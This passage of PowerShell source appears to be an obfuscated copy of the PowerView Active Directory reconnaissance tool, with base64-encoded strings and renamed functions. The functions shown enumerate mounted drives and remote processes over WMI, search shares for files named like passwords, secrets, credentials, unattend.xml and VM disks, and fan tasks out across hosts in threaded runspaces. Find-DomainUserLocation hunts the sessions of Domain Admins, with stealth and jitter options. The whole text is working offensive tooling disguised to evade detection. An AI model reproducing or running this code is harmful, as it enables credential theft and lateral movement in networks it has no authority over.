                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFcATQBJAFIAZQBnAEMAYQBjAGgAZQBkAFIARABQAEMAbwBuAG4AZQBjAHQAaQBvAG4AXQAgAEUAcgByAG8AcgAgAGEAYwBjAGUAcwBzAGkAbgBnACAAJAB7ADEAMQA2AH0ALAAgAGwAaQBrAGUAbAB5ACAAaQBuAHMAdQBmAGYAaQBjAGkAZQBuAHQAIABwAGUAcgBtAGkAcwBzAGkAbwBuAHMAIABvAHIAIABmAGkAcgBlAHcAYQBsAGwAIAByAHUAbABlAHMAIABvAG4AIABoAG8AcwB0ADoAIAAkAF8A')))
            }
        }
    }
}
function Get-WMIRegMountedDrive {
    [OutputType('PowerView.RegMountedDrive')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${94} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach (${116} in ${94}) {
            ${165} = 2147483651
            ${158} = @{
                'List' = $True
                'Class' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA=')))
                'Namespace' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA')))
                'Computername' = ${116}
                'ErrorAction' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcAA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${158}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            try {
                ${166} = gwmi @158
                ${168} = (${166}.EnumKey(${165}, '')).sNames | ? { $_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgAxAC0AWwAwAC0AOQBdACsALQBbADAALQA5AF0AKwAtAFsAMAAtADkAXQArAC0AWwAwAC0AOQBdACsAJAA='))) }
                ForEach (${164} in ${168}) {
                    try {
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                            ${120} = f94 -438 ${164} -Credential $Credential
                        }
                        else {
                            ${120} = f94 -438 ${164}
                        }
                        ${167} = (${166}.EnumKey(${165}, $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADEANgA0AH0AXABOAGUAdAB3AG8AcgBrAA=='))))).sNames
                        ForEach (${163} in ${167}) {
                            ${162} = ${166}.GetStringValue(${165}, $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADEANgA0AH0AXABOAGUAdAB3AG8AcgBrAFwAJAB7ADEANgAzAH0A'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AdgBpAGQAZQByAE4AYQBtAGUA')))).sValue
                            ${161} = ${166}.GetStringValue(${165}, $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADEANgA0AH0AXABOAGUAdAB3AG8AcgBrAFwAJAB7ADEANgAzAH0A'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAUABhAHQAaAA=')))).sValue
                            ${160} = ${166}.GetStringValue(${165}, $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADEANgA0AH0AXABOAGUAdAB3AG8AcgBrAFwAJAB7ADEANgAzAH0A'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA==')))).sValue
                            if (-not ${120}) { ${120} = '' }
                            if (${161} -and (${161} -ne '')) {
                                ${159} = New-Object PSObject
                                ${159} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${116}
                                ${159} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) ${120}
                                ${159} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAEkARAA='))) ${164}
                                ${159} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAByAGkAdgBlAEwAZQB0AHQAZQByAA=='))) ${163}
                                ${159} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AdgBpAGQAZQByAE4AYQBtAGUA'))) ${162}
                                ${159} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAUABhAHQAaAA='))) ${161}
                                ${159} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAByAGkAdgBlAFUAcwBlAHIATgBhAG0AZQA='))) ${160}
                                ${159}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBSAGUAZwBNAG8AdQBuAHQAZQBkAEQAcgBpAHYAZQA='))))
                                ${159}
                            }
                        }
                    }
                    catch {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFcATQBJAFIAZQBnAE0AbwB1AG4AdABlAGQARAByAGkAdgBlAF0AIABFAHIAcgBvAHIAOgAgACQAXwA=')))
                    }
                }
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFcATQBJAFIAZQBnAE0AbwB1AG4AdABlAGQARAByAGkAdgBlAF0AIABFAHIAcgBvAHIAIABhAGMAYwBlAHMAcwBpAG4AZwAgACQAewAxADEANgB9ACwAIABsAGkAawBlAGwAeQAgAGkAbgBzAHUAZgBmAGkAYwBpAGUAbgB0ACAAcABlAHIAbQBpAHMAcwBpAG8AbgBzACAAbwByACAAZgBpAHIAZQB3AGEAbABsACAAcgB1AGwAZQBzACAAbwBuACAAaABvAHMAdAA6ACAAJABfAA==')))
            }
        }
    }
}
function f86 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${94} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach (${116} in ${94}) {
            try {
                ${158} = @{
                    'ComputerName' = ${94}
                    'Class' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAF8AcAByAG8AYwBlAHMAcwA=')))
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${158}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
                Get-WMIobject @158 | % {
                    ${157} = $_.getowner();
                    ${112} = New-Object PSObject
                    ${112} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${116}
                    ${112} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBOAGEAbQBlAA=='))) $_.ProcessName
                    ${112} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBJAEQA'))) $_.ProcessID
                    ${112} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A'))) ${157}.Domain
                    ${112} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA='))) ${157}.User
                    ${112}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAFAAcgBvAGMAZQBzAHMA'))))
                    ${112}
                }
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFcATQBJAFAAcgBvAGMAZQBzAHMAXQAgAEUAcgByAG8AcgAgAGUAbgB1AG0AZQByAGEAdABpAG4AZwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwBlAHMAIABvAG4AIAAnACQAewAxADEANgB9ACcALAAgAGEAYwBjAGUAcwBzACAAbABpAGsAZQBsAHkAIABkAGUAbgBpAGUAZAA6ACAAJABfAA==')))
            }
        }
    }
}
function f81 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path = '.\',
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $Include = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBwAGEAcwBzAHcAbwByAGQAKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBzAGUAbgBzAGkAdABpAHYAZQAqAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBhAGQAbQBpAG4AKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBsAG8AZwBpAG4AKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBzAGUAYwByAGUAdAAqAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBuAGEAdAB0AGUAbgBkACoALgB4AG0AbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHYAbQBkAGsA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBjAHIAZQBkAHMAKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBjAHIAZQBkAGUAbgB0AGkAYQBsACoA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAGMAbwBuAGYAaQBnAA==')))),
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastAccessTime,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastWriteTime,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $CreationTime,
        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $OfficeDocs,
        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $FreshEXEs,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        ${f14},
        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        ${f7},
        [Switch]
        ${f6},
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${48} =  @{
            'Recurse' = $True
            'ErrorAction' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA=')))
            'Include' = $Include
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBmAGYAaQBjAGUARABvAGMAcwA=')))]) {
            ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGMAbAB1AGQAZQA=')))] = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAGQAbwBjAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAGQAbwBjAHgA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHgAbABzAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHgAbABzAHgA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHAAcAB0AA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHAAcAB0AHgA'))))
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgByAGUAcwBoAEUAWABFAHMA')))]) {
            $LastAccessTime = (Get-Date).AddDays(-7).ToString($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBNAC8AZABkAC8AeQB5AHkAeQA='))))
            ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGMAbAB1AGQAZQA=')))] = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAGUAeABlAA=='))))
        }
        ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAYwBlAA==')))] = -not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAbAB1AGQAZQBIAGkAZABkAGUAbgA=')))]
        ${150} = @{}
        function f92 {
            [CmdletBinding()]Param([String]$Path)
            try {
                ${156} = [IO.File]::OpenWrite($Path)
                ${156}.Close()
                $True
            }
            catch {
                $False
            }
        }
    }
    PROCESS {
        ForEach (${154} in $Path) {
            if ((${154} -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcAFwAXAAuACoAXABcAC4AKgA=')))) -and ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))])) {
                ${155} = (New-Object System.Uri(${154})).Host
                if (-not ${150}[${155}]) {
                    f93 -94 ${155} -Credential $Credential
                    ${150}[${155}] = $True
                }
            }
            ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA=')))] = ${154}
            ls @48 | % {
                ${153} = $True
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAbAB1AGQAZQBGAG8AbABkAGUAcgBzAA==')))] -and ($_.PSIsContainer)) {
                    Write-Verbose "Excluding: $($_.FullName)"
                    ${153} = $False
                }
                if ($LastAccessTime -and ($_.LastAccessTime -lt $LastAccessTime)) {
                    ${153} = $False
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABXAHIAaQB0AGUAVABpAG0AZQA=')))] -and ($_.LastWriteTime -lt $LastWriteTime)) {
                    ${153} = $False
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGkAbwBuAFQAaQBtAGUA')))] -and ($_.CreationTime -lt $CreationTime)) {
                    ${153} = $False
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAFcAcgBpAHQAZQBBAGMAYwBlAHMAcwA=')))] -and (-not (f92 -Path $_.FullName))) {
                    ${153} = $False
                }
                if (${153}) {
                    ${152} = @{
                        'Path' = $_.FullName
                        'Owner' = $((Get-Acl $_.FullName).Owner)
                        'LastAccessTime' = $_.LastAccessTime
                        'LastWriteTime' = $_.LastWriteTime
                        'CreationTime' = $_.CreationTime
                        'Length' = $_.Length
                    }
                    ${151} = New-Object -TypeName PSObject -Property ${152}
                    ${151}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBGAG8AdQBuAGQARgBpAGwAZQA='))))
                    ${151}
                }
            }
        }
    }
    END {
        ${150}.Keys | f91
    }
}
function f76 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [String[]]
        ${94},
        [Parameter(Position = 1, Mandatory = $True)]
        [System.Management.Automation.ScriptBlock]
        ${f12},
        [Parameter(Position = 2)]
        [Hashtable]
        ${f11},
        [Int]
        [ValidateRange(1,  100)]
        $Threads = 20,
        [Switch]
        ${f13}
    )
    BEGIN {
        ${145} = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        ${145}.ApartmentState = [System.Threading.ApartmentState]::STA
        if (-not ${f13}) {
            ${149} = gv -Scope 2
            ${148} = @('?',$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQByAGcAcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AcwBvAGwAZQBGAGkAbABlAE4AYQBtAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGUAYwB1AHQAaQBvAG4AQwBvAG4AdABlAHgAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgBhAGwAcwBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABPAE0ARQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHAAdQB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHAAdQB0AE8AYgBqAGUAYwB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBBAGwAaQBhAHMAQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBEAHIAaQB2AGUAQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBFAHIAcgBvAHIAQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBGAHUAbgBjAHQAaQBvAG4AQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBIAGkAcwB0AG8AcgB5AEMAbwB1AG4AdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBWAGEAcgBpAGEAYgBsAGUAQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB5AEkAbgB2AG8AYwBhAHQAaQBvAG4A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgB1AGwAbAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABJAEQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEIAbwB1AG4AZABQAGEAcgBhAG0AZQB0AGUAcgBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEMAbwBtAG0AYQBuAGQAUABhAHQAaAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEMAdQBsAHQAdQByAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEQAZQBmAGEAdQBsAHQAUABhAHIAYQBtAGUAdABlAHIAVgBhAGwAdQBlAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEgATwBNAEUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAFMAYwByAGkAcAB0AFIAbwBvAHQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAFUASQBDAHUAbAB0AHUAcgBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAFYAZQByAHMAaQBvAG4AVABhAGIAbABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABXAEQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGUAbABsAEkAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AG4AYwBoAHIAbwBuAGkAegBlAGQASABhAHMAaAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAByAHUAZQA='))))
            ForEach (${147} in ${149}) {
                if (${148} -NotContains ${147}.Name) {
                ${145}.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList ${147}.name,${147}.Value,${147}.description,${147}.options,${147}.attributes))
                }
            }
            ForEach (${146} in (ls Function:)) {
                ${145}.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList ${146}.Name, ${146}.Definition))
            }
        }
        ${130} = [RunspaceFactory]::CreateRunspacePool(1, $Threads, ${145}, $Host)
        ${130}.Open()
        $Method = $Null
        ForEach (${143} in [PowerShell].GetMethods() | ? { $_.Name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBlAGcAaQBuAEkAbgB2AG8AawBlAA=='))) }) {
            ${144} = ${143}.GetParameters()
            if ((${144}.Count -eq 2) -and ${144}[0].Name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHAAdQB0AA=='))) -and ${144}[1].Name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwB1AHQAcAB1AHQA')))) {
                $Method = ${143}.MakeGenericMethod([Object], [Object])
                break
            }
        }
        ${132} = @()
        ${94} = ${94} | ? {$_ -and $_.Trim()}
        Write-Verbose "[New-ThreadedFunction] Total number of hosts: $(${94}.count)"
        if ($Threads -ge ${94}.Length) {
            $Threads = ${94}.Length
        }
        ${140} = [Int](${94}.Length/$Threads)
        ${138} = @()
        ${142} = 0
        ${141} = ${140}
        for(${67} = 1; ${67} -le $Threads; ${67}++) {
            ${139} = New-Object System.Collections.ArrayList
            if (${67} -eq $Threads) {
                ${141} = ${94}.Length
            }
            ${139}.AddRange(${94}[${142}..(${141}-1)])
            ${142} += ${140}
            ${141} += ${140}
            ${138} += @(,@(${139}.ToArray()))
        }
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAFQAaAByAGUAYQBkAGUAZABGAHUAbgBjAHQAaQBvAG4AXQAgAFQAbwB0AGEAbAAgAG4AdQBtAGIAZQByACAAbwBmACAAdABoAHIAZQBhAGQAcwAvAHAAYQByAHQAaQB0AGkAbwBuAHMAOgAgACQAVABoAHIAZQBhAGQAcwA=')))
        ForEach (${137} in ${138}) {
            ${135} = [PowerShell]::Create()
            ${135}.runspacepool = ${130}
            $Null = ${135}.AddScript(${f12}).AddParameter($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))), ${137})
            if (${f11}) {
                ForEach (${136} in ${f11}.GetEnumerator()) {
                    $Null = ${135}.AddParameter(${136}.Name, ${136}.Value)
                }
            }
            ${134} = New-Object Management.Automation.PSDataCollection[Object]
            ${132} += @{
                PS = ${135}
                Output = ${134}
                Result = $Method.Invoke(${135}, @($Null, [Management.Automation.PSDataCollection[Object]]${134}))
            }
        }
    }
    END {
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAFQAaAByAGUAYQBkAGUAZABGAHUAbgBjAHQAaQBvAG4AXQAgAFQAaAByAGUAYQBkAHMAIABlAHgAZQBjAHUAdABpAG4AZwA=')))
        Do {
            ForEach (${131} in ${132}) {
                ${131}.Output.ReadAll()
            }
            sleep -Seconds 1
        }
        While ((${132} | ? { -not $_.Result.IsCompleted }).Count -gt 0)
        ${133} = 100
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAFQAaAByAGUAYQBkAGUAZABGAHUAbgBjAHQAaQBvAG4AXQAgAFcAYQBpAHQAaQBuAGcAIAAkAHsAMQAzADMAfQAgAHMAZQBjAG8AbgBkAHMAIABmAG8AcgAgAGYAaQBuAGEAbAAgAGMAbABlAGEAbgB1AHAALgAuAC4A')))
        for (${67}=0; ${67} -lt ${133}; ${67}++) {
            ForEach (${131} in ${132}) {
                ${131}.Output.ReadAll()
                ${131}.PS.Dispose()
            }
            sleep -S 1
        }
        ${130}.Dispose()
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAFQAaAByAGUAYQBkAGUAZABGAHUAbgBjAHQAaQBvAG4AXQAgAGEAbABsACAAdABoAHIAZQBhAGQAcwAgAGMAbwBtAHAAbABlAHQAZQBkAA==')))
    }
}
function Find-DomainUserLocation {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserLocation')]
    [CmdletBinding(DefaultParameterSetName = 'UserGroupIdentity')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        ${94},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,
        [Alias('Unconstrained')]
        [Switch]
        $ComputerUnconstrained,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,
        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,
        [ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,
        [Parameter(ParameterSetName = 'UserGroupIdentity')]
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $UserGroupIdentity = 'Domain Admins',
        [Alias('AdminCount')]
        [Switch]
        $UserAdminCount,
        [Alias('AllowDelegation')]
        [Switch]
        $UserAllowDelegation,
        [Switch]
        $CheckAccess,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $StopOnSuccess,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Parameter(ParameterSetName = 'ShowAll')]
        [Switch]
        $ShowAll,
        [Switch]
        $Stealth,
        [String]
        [ValidateSet('DFS', 'DC', 'File', 'All')]
        $StealthSource = 'All',
        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        ${96} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEwARABBAFAARgBpAGwAdABlAHIA')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ComputerLDAPFilter }
